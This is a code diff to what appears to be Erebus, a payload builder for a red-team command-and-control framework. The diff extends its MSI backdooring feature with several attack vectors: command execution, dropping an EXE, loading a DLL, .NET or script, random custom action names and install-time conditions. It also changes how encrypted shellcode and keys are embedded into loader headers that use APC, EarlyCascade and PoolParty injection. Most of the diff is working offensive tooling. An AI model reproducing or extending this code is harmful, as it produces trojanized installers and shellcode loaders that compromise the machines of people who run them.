@@ -10,7 +10,13 @@ TODO:
 '''
 from erebus_wrapper.erebus.modules.payload_dll_proxy import generate_proxies
 from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
-from erebus_wrapper.erebus.modules.container_msi import build_msi, hijack_msi
+from erebus_wrapper.erebus.modules.container_msi import (
+    build_msi,
+    hijack_msi,
+    add_multiple_files_to_msi,
+    ErebusActionTypes,
+    ErebusInstallerToolkit
+)
 from erebus_wrapper.erebus.modules.trigger_lnk import create_payload_trigger
 from erebus_wrapper.erebus.modules.trigger_bat import create_bat_payload_trigger
 from erebus_wrapper.erebus.modules.trigger_msi import create_msi_payload_trigger
@@ -125,19 +131,18 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "Shellcode Loader",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
 
         BuildParameter(
             name = "0.2 Loader Format",
             parameter_type = BuildParameterType.ChooseOne,
-            description = "Select the loader's filetype.",
+            description = f"Select the loader's filetype. (DLL Unsupported in {semver})",
             choices = ["EXE", "DLL"],
             default_value = "EXE",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
-                # Change this if you are using a custom Loader written in another language
-                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
 
@@ -149,8 +154,6 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "debug",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
-                # Change this if you are using a custom shellcode retrieval method
-                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
 
@@ -162,8 +165,6 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "debug",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
-                # Change this if you are using a custom shellcode retrieval method
-                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
             ]
         ),
 
@@ -172,15 +173,14 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             name = "0.4 Shellcode Loader - Injection Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the injection technique for the Shellcode Loader:
-1 = NtQueueApcThread (APC injection to suspended thread - Remote)
-2 = NtMapViewOfSection (Section mapping injection - Remote)
-3 = CreateFiber (Fiber-based execution - Self)
-4 = EarlyCascade (Early Bird APC injection - Remote)
-5 = PoolParty (Worker Factory thread pool injection - Remote)""",
+1 = NtQueueApcThread (Remote)
+2 = NtMapViewOfSection (Remote)
+3 = CreateFiber (Self)
+4 = EarlyCascade (Remote)
+5 = PoolParty (Remote)""",
             choices = ["1", "2", "3", "4", "5"],
             default_value = "1",
             hide_conditions = [
-                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
             ]
         ),
@@ -191,7 +191,6 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             description = "Target process for remote injection (e.g., notepad.exe, explorer.exe)",
             default_value = "notepad.exe",
             hide_conditions = [
-                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
             ]
         ),
@@ -201,15 +200,14 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             name = "0.6 ClickOnce - Injection Method",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the injection method for ClickOnce:
-createfiber = Fiber-based self-injection
-earlycascade = Early Bird APC injection (remote)
-poolparty = Worker Factory thread pool injection (remote)
-classic = Classic CreateRemoteThread injection (remote)
-enumdesktops = EnumDesktops callback injection (self)""",
+earlycascade (remote)
+poolparty (remote)
+classic (remote)
+createfiber (self)
+enumdesktops (self)""",
             choices = ["createfiber", "earlycascade", "poolparty", "classic", "enumdesktops"],
             default_value = "createfiber",
             hide_conditions = [
-                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
             ]
         ),
@@ -456,6 +454,69 @@ generated if none have been entered.""",
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
             ]
         ),
+        BuildParameter(
+            name="5.4 MSI Attack Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="""Attack vector for MSI backdoor injection:
+- execute: Run command via CustomAction (stealthiest)
+- run-exe: Extract and execute EXE from Binary table
+- load-dll: Load native DLL via DllEntry
+- dotnet: Load .NET assembly (auto-detected)
+- script: Execute VBScript/JScript (requires entry point)""",
+            choices=["execute", "run-exe", "load-dll", "dotnet", "script"],
+            default_value="execute",
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
+                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
+            ]
+        ),
+        BuildParameter(
+            name="5.5 MSI Entry Point",
+            parameter_type=BuildParameterType.String,
+            description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
+                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
+                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
+                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe")
+            ]
+        ),
+        BuildParameter(
+            name="5.6 MSI Command Arguments",
+            parameter_type=BuildParameterType.String,
+            description="Command line arguments for execute/run-exe attacks",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
+                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
+                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.NotIn, value=["execute", "run-exe"])
+            ]
+        ),
+        BuildParameter(
+            name="5.7 MSI Execution Condition",
+            parameter_type=BuildParameterType.String,
+            description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
+            default_value="NOT REMOVE",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
+                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
+            ]
+        ),
+        BuildParameter(
+            name="5.8 MSI Custom Action Name",
+            parameter_type=BuildParameterType.String,
+            description="Custom action name (leave empty for random generation)",
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
+                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
+            ]
+        ),
         #Codesigning
         BuildParameter(
             name="6.0 Codesign Loader",
@@ -576,11 +637,19 @@ generated if none have been entered.""",
     ]
 
     async def backdoor_msi_payload(self, agent_build_path):
-        """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory"""
+        """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory
+
+        Enhanced with support for multiple attack vectors:
+        - execute: Direct command execution
+        - run-exe: Binary extraction and execution
+        - load-dll: DLL loading with custom entry points
+        - dotnet: .NET assembly loading
+        - script: VBScript/JScript execution
+        """
         msi_backdoor_uuid = self.get_parameter("5.3 MSI Backdoor File")
         if not msi_backdoor_uuid:
             return  # No MSI to backdoor
-        
+
         try:
             # Update build step
             await SendMythicRPCPayloadUpdatebuildStep(
@@ -590,52 +659,112 @@ generated if none have been entered.""",
                 StepStdout="Downloading uploaded MSI installer...",
                 StepSuccess=True,
             ))
-            
+
             # Download the uploaded MSI file
             file_resp = await SendMythicRPCFileGetContent(
                 MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
             )
-            
+
             # Save the MSI to a temporary location
             temp_dir = Path(tempfile.gettempdir())
             source_msi_path = temp_dir / f"source_{msi_backdoor_uuid}.msi"
             source_msi_path.write_bytes(file_resp.Content)
-            
+
+            # Get attack parameters
+            attack_type = self.get_parameter("5.4 MSI Attack Type")
+            entry_point = self.get_parameter("5.5 MSI Entry Point")
+            command_args = self.get_parameter("5.6 MSI Command Arguments")
+            condition = self.get_parameter("5.7 MSI Execution Condition")
+            custom_action_name = self.get_parameter("5.8 MSI Custom Action Name")
+
+            # Generate random name if not provided
+            if not custom_action_name:
+                custom_action_name = ErebusInstallerToolkit.generate_identifier(6, 12)
+
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Backdooring MSI",
-                StepStdout="Injecting payload into MSI installer...",
+                StepStdout=f"Injecting payload into MSI installer (attack: {attack_type})...",
                 StepSuccess=True,
             ))
-            
-            # Get the payload executable path
+
+            # Get the payload path
             payload_dir = Path(agent_build_path) / "payload"
-            try:
-                payload_exe = next(p for p in payload_dir.iterdir() if p.is_file() and p.suffix.lower() == ".exe")
-            except StopIteration:
-                raise RuntimeError("No .exe payload found in payload directory for MSI backdooring!")
-            
-            # Call hijack_msi to inject the payload
+            payload_file = None
+
+            # Determine payload file based on attack type
+            if attack_type in ["load-dll", "dotnet"]:
+                # Look for DLL
+                try:
+                    payload_file = next(p for p in payload_dir.iterdir()
+                                      if p.is_file() and p.suffix.lower() == ".dll")
+                except StopIteration:
+                    # Fallback to EXE if no DLL found
+                    try:
+                        payload_file = next(p for p in payload_dir.iterdir()
+                                          if p.is_file() and p.suffix.lower() == ".exe")
+                    except StopIteration:
+                        raise RuntimeError("No DLL or EXE payload found for MSI backdooring!")
+
+            elif attack_type == "script":
+                # Look for script files
+                try:
+                    payload_file = next(p for p in payload_dir.iterdir()
+                                      if p.is_file() and p.suffix.lower() in [".vbs", 
+                                                                              ".js", ".vbe", ".jse"])
+                except StopIteration:
+                    raise RuntimeError("No script file (.vbs/.js) found for script attack!")
+
+            else:  # execute, run-exe
+                # Look for EXE
+                try:
+                    payload_file = next(p for p in payload_dir.iterdir()
+                                      if p.is_file() and p.suffix.lower() == ".exe")
+                except StopIteration:
+                    raise RuntimeError("No .exe payload found in payload directory for MSI backdooring!")
+
+            # Validate entry point for attacks that require it
+            if attack_type in ["load-dll", "dotnet", "script"] and not entry_point:
+                if attack_type == "script":
+                    raise RuntimeError(f"Entry point (function name) is required for {attack_type} attack")
+                else:
+                    # Use default for DLL
+                    entry_point = "DllEntry"
+
+            # Call hijack_msi with advanced parameters
             backdoored_msi_path = hijack_msi(
                 source_msi=source_msi_path,
-                payload_path=payload_exe,
+                payload_path=payload_file,
                 build_path=Path(agent_build_path),
-                custom_action_name="SystemUpdater"
+                custom_action_name=custom_action_name,
+                attack_type=attack_type,
+                entry_point=entry_point,
+                command_args=command_args,
+                condition=condition
             )
-            
+
             # Move the backdoored MSI into the payload directory
             final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
             shutil.copy2(backdoored_msi_path, final_msi_path)
-            
+
+            # Build success message with attack details
+            success_msg = f"Successfully backdoored MSI: {final_msi_path.name}\n"
+            success_msg += f"Attack Type: {attack_type}\n"
+            success_msg += f"Custom Action: {custom_action_name}\n"
+            if entry_point:
+                success_msg += f"Entry Point: {entry_point}\n"
+            if command_args:
+                success_msg += f"Arguments: {command_args}\n"
+            success_msg += f"Condition: {condition}"
+
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Backdooring MSI",
-                StepStdout=f"Successfully backdoored MSI: {final_msi_path.name}",
-                StepSuccess=True,
+                StepStdout=success_msg,
             ))
-            
+
         except Exception as e:
             await SendMythicRPCPayloadUpdatebuildStep(
                 MythicRPCPayloadUpdateBuildStepMessage(
@@ -726,14 +855,16 @@ generated if none have been entered.""",
 
             obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
             obfuscated_shellcode_path = str(obfuscated_shellcode_path)
-            
+
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
             encryption_key_path_cpp = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "key.hpp"
+            encryption_shellcode_path_cpp = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
 
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
             encryption_key_path_cpp = str(encryption_key_path_cpp)
+            encryption_shellcode_path_cpp = str(encryption_shellcode_path_cpp)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -851,18 +982,25 @@ generated if none have been entered.""",
                     if self.get_parameter("2.2 Encryption Key") != "NONE":
                         cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
 
-                    key_src = subprocess.check_output(cmd, text=True)
-                    output += key_src
+                    shellcode_src = subprocess.check_output(cmd, text=True)
+                    output += shellcode_src
 
-                    start = key_src.find("unsigned char key")
-                    end   = key_src.find("};", start) + 2
-                    key_array = key_src[start:end]
+                    # Write shellcode to file
+                    start = shellcode_src.find("unsigned char shellcode")
+                    end   = shellcode_src.find("};", start) + 2
+                    shellcode_array = shellcode_src[start:end]
+                    output += shellcode_array
+                    with open(encryption_shellcode_path_cpp, "w+") as file:
+                        file.write(shellcode_array)
+
+                    # Write key to file
+                    start = shellcode_src.find("unsigned char key")
+                    end   = shellcode_src.find("};", start) + 2
+                    key_array = shellcode_src[start:end]
                     output += key_array
-
                     with open(encryption_key_path_cpp, "w+") as file:
                         file.write(key_array)
 
-                    # response.payload = open(obfuscated_shellcode_path, "rb").read()
                     response.status = BuildStatus.Success
                     response.build_message = "Shellcode Generated!"
                     response.build_stdout = output + "\n" + obfuscated_shellcode_path
@@ -1064,11 +1202,11 @@ generated if none have been entered.""",
                             "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
                         }
                         rendered_config = config_template.render(**config_data)
-                        
+
                         # Write the rendered config to the destination
                         with open(config_hpp_destination, "w") as config_file:
                             config_file.write(rendered_config)
-                        
+
                         response.status = BuildStatus.Success
                         response.build_message = "Shellcode Loader config generated!"
                         await SendMythicRPCPayloadUpdatebuildStep(
@@ -1199,7 +1337,7 @@ generated if none have been entered.""",
                                         encryption_key_bytes = ", ".join(hex_matches)
                             except Exception as key_error:
                                 output += f"Warning: Could not extract encryption key: {str(key_error)}\n"
-                        
+
                         injection_config_template = environment.get_template("InjectionConfig.cs")
                         injection_config_data = {
                             "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
@@ -1207,10 +1345,10 @@ generated if none have been entered.""",
                             "ENCRYPTION_KEY": encryption_key_bytes,
                         }
                         rendered_injection_config = injection_config_template.render(**injection_config_data)
-                        
+
                         with open(injection_config_destination, "w") as config_file:
                             config_file.write(rendered_injection_config)
-                        
+
                         response.status = BuildStatus.Success
                         response.build_message = "ClickOnce config generated!"
                         await SendMythicRPCPayloadUpdatebuildStep(
@@ -1423,7 +1561,7 @@ generated if none have been entered.""",
                     response.status = BuildStatus.Error
                     response.build_stderr = f"Code signing failed: {str(e)}"
                     return response
-  
+
 
             ######################### Creating Decoy Section #########################
             decoy_dir = Path(agent_build_path) / "decoys"
@@ -1523,7 +1661,6 @@ generated if none have been entered.""",
                             StepStdout=f"{trigger_type} Trigger created at: {trigger_path}",
                             StepSuccess=True,
                         ))
-
                 except Exception as e:
                     response.status = BuildStatus.Error
                     response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
@@ -1537,10 +1674,10 @@ generated if none have been entered.""",
                     return response
             ######################### End Of Trigger Generation Section #########################
             ######################### MSI Backdooring Section #########################
-            
+
             # Backdoor MSI if user uploaded one (adds backdoored MSI to payload directory)
             await self.backdoor_msi_payload(agent_build_path)
-            
+
             ######################### End Of MSI Backdooring Section #########################
             ######################### Final Payload / Container #########################
 
